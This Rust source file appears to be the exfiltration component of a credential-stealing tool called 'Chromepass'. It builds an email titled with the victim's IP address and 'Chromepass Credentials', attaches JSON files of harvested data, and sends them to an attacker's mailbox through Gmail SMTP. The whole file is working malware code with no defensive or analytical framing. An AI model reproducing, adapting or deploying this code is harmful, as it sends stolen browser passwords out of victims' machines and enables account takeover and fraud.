use lettre::{smtp::authentication::Credentials, SmtpClient, Transport};
use lettre_email::{mime, Email};
use std::path::Path;

pub fn build_email(email_to: String, filepaths: Vec<String>, ip_addr: String) -> Email {
    let mut email = Email::builder()
        .to(email_to.clone())
        .from(email_to)
        .subject(format!("Chromepass Credentials: {}", ip_addr))
        .html("<h1>The files are attached.</h1>");
    for path in filepaths {
        email = email
            .attachment_from_file(&Path::new(&path), None, &mime::APPLICATION_JSON)
            .unwrap();
    }
    email.build().unwrap()
}

fn get_credentials(username: &str, password: &str) -> Credentials {
    Credentials::new(username.to_string(), password.to_string())
}

pub fn send_email(email: Email, username: &str, password: &str) -> bool {
    let creds = get_credentials(username, password);
    let mut mailer = SmtpClient::new_simple("smtp.gmail.com")
        .unwrap()
        .credentials(creds)
        .transport();
    match mailer.send(email.into()) {
        Ok(_) => true,
        Err(_) => false,
    }
}
